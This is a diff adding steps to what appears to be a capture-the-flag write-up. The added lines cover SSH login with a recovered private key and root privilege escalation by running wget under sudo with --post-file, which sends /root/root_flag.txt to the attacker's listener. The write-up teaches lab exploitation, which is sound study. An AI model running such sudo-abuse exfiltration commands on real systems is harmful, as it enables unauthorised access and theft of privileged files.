@@ -24,7 +24,11 @@
 ![image](https://user-images.githubusercontent.com/60177793/94952354-791e4600-0503-11eb-89e1-2b3f0c7a3651.png)
 ##### now we need to give proper permissions to execute the file
 ![image](https://user-images.githubusercontent.com/60177793/94952456-a5d25d80-0503-11eb-87ca-b2463ba29ab7.png)
+###### now we need to run this command ; ssh -i id_rsa jessie@<ipaddress>
 ![image](https://user-images.githubusercontent.com/60177793/94952480-b1be1f80-0503-11eb-997b-069af1abba42.png)
+  ##### now for the root privilege escalation:
+  #####  first we need to check the sudo -l to find what are available then i found it has no password so we cannot create a payload for root user then i had got an idea of exploiting vulnerability! then i had created an:- “ nc -lvnp 4444”
+###### on my machine i.e attackers machine  and run a command :- sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<Tunnel IP>:4445
 ![image](https://user-images.githubusercontent.com/60177793/94952557-c8fd0d00-0503-11eb-844e-37874232fe68.png)
 
 ![image](https://user-images.githubusercontent.com/60177793/94952519-bbe01e00-0503-11eb-9d7a-69a61e1d7eae.png)
